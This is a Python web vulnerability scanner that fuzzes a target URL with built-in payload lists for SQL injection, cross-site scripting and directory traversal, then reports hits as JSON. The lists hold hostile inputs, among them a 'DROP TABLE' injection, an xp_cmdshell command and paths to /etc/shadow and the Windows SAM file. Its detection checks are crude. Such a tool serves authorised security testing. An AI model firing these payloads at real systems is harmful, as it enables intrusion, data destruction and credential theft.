banner = """
██████████                     █████   ████              █████                   
░░███░░░░░███                   ░░███   ███░              ░░███                    
 ░███    ░███ ████████   ██████  ░███  ███     ██████   ███████   ██████  ████████ 
 ░██████████ ░░███░░███ ███░░███ ░███████     ███░░███ ███░░███  ███░░███░░███░░███
 ░███░░░░░░   ░███ ░░░ ░███ ░███ ░███░░███   ░███ ░███░███ ░███ ░███████  ░███ ░░░ 
 ░███         ░███     ░███ ░███ ░███ ░░███  ░███ ░███░███ ░███ ░███░░░   ░███     
 █████        █████    ░░██████  █████ ░░████░░██████ ░░████████░░██████  █████    
░░░░░        ░░░░░      ░░░░░░  ░░░░░   ░░░░  ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░     
                                                                                   
                                                                                   
                                                                                   
                                                                                   
                                                                                   
  █████   ██████   ██████   ████████   ████████    ██████  ████████                
 ███░░   ███░░███ ░░░░░███ ░░███░░███ ░░███░░███  ███░░███░░███░░███               
░░█████ ░███ ░░░   ███████  ░███ ░███  ░███ ░███ ░███████  ░███ ░░░                
 ░░░░███░███  ███ ███░░███  ░███ ░███  ░███ ░███ ░███░░░   ░███                    
 ██████ ░░██████ ░░████████ ████ █████ ████ █████░░██████  █████                   
░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░                    

BY: AHMAD JOUMAA
==================================================================================
"""
print(banner)


import requests, argparse, sys, json, warnings, time
from colorama import *
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

warnings.filterwarnings('ignore')

# Browser options
options = webdriver.FirefoxOptions()
options.add_argument('--disable-xss-auditor')
options.add_argument('--disable-web-security')
options.add_argument('--ignore-certificate-errors')
options.add_argument('--no-sandbox')
options.add_argument('--log-level=3')
options.add_argument('--disable-notifications')

# path geckodriver
gecko_path = "/usr/local/bin/geckodriver"
service = Service(gecko_path)

#anlaizy input
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="Target URL containing {fuzz} as a placeholder for attack")
parser.add_argument('--crawl', type=int, default=2, help="Number of crawl attempts (default: 2)")
parser.add_argument('--scan_type', choices=['sql', 'xss', 'dir_traversal'], required=True, help="Choose scan type: sql, xss, or dir_traversal")
parser.add_argument('--delay', type=int, default=1, help="Delay in seconds between requests (default: 1 seconds)")
parser.add_argument('--output', type=str, help="Specify the output file to save the report (e.g., report.json)")  # معلمة لحفظ التقرير
args = parser.parse_args()

if '{fuzz}' not in args.url:
    sys.exit(Style.BRIGHT + Fore.RED + "URL must contain the {fuzz} placeholder!")

# General scan setup
target = args.url
scan_results = []

# Get the appropriate payloads based on scan type
def get_payloads(scan_type):
    if scan_type == 'sql':
        return [
            "' OR 1=1 --",
            "' OR 'a'='a",
            '" OR "a"="a',
            "UNION SELECT null, null, null --",
            "SELECT * FROM users WHERE username = '' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1#",
            "\" OR \"\"=\"",
            "' OR ''='",
            "1' OR '1'='1' --",
            "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'",
            "'; DROP TABLE users --",
            "1 AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; exec master..xp_cmdshell('ping 10.10.1.2')--",
            "'; SELECT pg_sleep(10); --"
        ]
    elif scan_type == 'xss':
        return [
            "<script>alert('XSS');</script>",
            "<img src='x' onerror='alert(1)'>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg/onload=alert(1)>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "<body onload=alert('XSS')>",
            "<input type=\"image\" src=\"javascript:alert('XSS');\">",
            "<img src=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<b onmouseover=alert('XSS')>Click here!</b>",
            "<iframe src=javascript:alert(1)></iframe>",
            "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">"
        ]
    elif scan_type == 'dir_traversal':
        return [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "..//..//..//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "../../boot.ini",
            "../../Windows/System32/config/SAM",
            "../../../../windows/win.ini",
            "..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "../etc/shadow",
            "../WEB-INF/web.xml",
            "../../../windows/system32/drivers/etc/hosts"
        ]

# SQL Injection fuzzing function with delay
def fuzz_sql(url, payloads, delay):
    results = []
    for payload in payloads:
        time.sleep(delay)  # Delay before each request
        print(Style.BRIGHT + Fore.CYAN + f"Testing SQL payload: {payload.strip()}")
        new_url = url.replace("{fuzz}", payload.strip())
        request = requests.get(new_url)
        result = {
            "payload": payload.strip(),
            "url_tested": new_url,
            "vulnerability_found": False,
            "details": ""
        }
        if request.elapsed.total_seconds() > 7:
            result["details"] = "Timeout detected"
        else:
            if "sql" in request.text.lower() or "error" in request.text.lower():
                result["vulnerability_found"] = True
                result["details"] = f"Potential SQL Injection found with payload: {payload.strip()}"
                print(Style.BRIGHT + Fore.GREEN + f"SQL Injection vulnerability found: {payload.strip()}")
            else:
                result["details"] = "No vulnerability found"
                print(Style.BRIGHT + Fore.RED + f"No SQL Injection with payload: {payload.strip()}")
        results.append(result)
    return results

# XSS testing function with delay using Selenium
def test_xss(payload, delay):
    time.sleep(delay)  # Delay before each request
    print(Style.BRIGHT + Fore.CYAN + f"Testing XSS payload: {payload.strip()}")
    result = {
        "payload": payload.strip(),
        "url_tested": target.replace('{fuzz}', payload.strip()),
        "vulnerability_found": False,
        "details": ""
    }
    driver = None
    try:
        driver = webdriver.Firefox(service=service, options=options)
        driver.get(result["url_tested"])

        # Wait for page to load completely
        WebDriverWait(driver, 10).until(lambda d: d.execute_script("return document.readyState") == "complete")

        # Try to detect XSS alert
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert.accept()
            result["vulnerability_found"] = True
            result["details"] = f"XSS vulnerability found with payload: {payload.strip()}"
            print(Style.BRIGHT + Fore.GREEN + f"XSS vulnerability found: {payload.strip()}")
        except TimeoutException:
            page_source = driver.page_source
            if payload.strip() in page_source:
                result["vulnerability_found"] = True
                result["details"] = f"XSS vulnerability found in source: {payload.strip()}"
                print(Style.BRIGHT + Fore.GREEN + f"XSS vulnerability found in source: {payload.strip()}")
            else:
                result["details"] = "No vulnerability found"
                print(Style.BRIGHT + Fore.RED + f"No XSS with payload: {payload.strip()}")
    except WebDriverException as e:
        result["details"] = f"Browser error: {str(e)}"
        print(Style.BRIGHT + Fore.RED + f"Browser error with payload: {payload.strip()}")
    finally:
        if driver:
            driver.quit()
    return result

# Directory Traversal fuzzing function with delay
def fuzz_dir_traversal(url, payloads, delay):
    results = []
    for payload in payloads:
        time.sleep(delay)  # Delay before each request
        print(Style.BRIGHT + Fore.CYAN + f"Testing Directory Traversal payload: {payload.strip()}")
        new_url = url.replace("{fuzz}", payload.strip())
        request = requests.get(new_url)
        result = {
            "payload": payload.strip(),
            "url_tested": new_url,
            "vulnerability_found": False,
            "details": ""
        }
        if request.elapsed.total_seconds() > 7:
            result["details"] = "Timeout detected"
        else:
            if "root:x" in request.text or "passwd" in request.text:
                result["vulnerability_found"] = True
                result["details"] = f"Potential Directory Traversal found with payload: {payload.strip()}"
                print(Style.BRIGHT + Fore.GREEN + f"Directory Traversal vulnerability found: {payload.strip()}")
            else:
                result["details"] = "No vulnerability found"
                print(Style.BRIGHT + Fore.RED + f"No Directory Traversal with payload: {payload.strip()}")
        results.append(result)
    return results

# Perform scan based on selected scan type
def perform_scan(scan_type, url, delay):
    payloads = get_payloads(scan_type)
    if scan_type == "sql":
        return fuzz_sql(url, payloads, delay)
    elif scan_type == "xss":
        results = []
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(test_xss, payload, delay) for payload in payloads]
            for future in as_completed(futures):
                results.append(future.result())
        return results
    elif scan_type == "dir_traversal":
        return fuzz_dir_traversal(url, payloads, delay)

if __name__ == "__main__":
    # start scan
    results = perform_scan(args.scan_type, target, args.delay)
    
    # print result on screen
    print(Style.BRIGHT + Fore.YELLOW + json.dumps(results, indent=4))

    # report save 
    if args.output:
        try:
            with open(args.output, 'w') as output_file:
                json.dump(results, output_file, indent=4)
            print(Style.BRIGHT + Fore.GREEN + f"Report saved to {args.output}")
        except Exception as e:
            print(Style.BRIGHT + Fore.RED + f"Failed to save the report: {str(e)}")
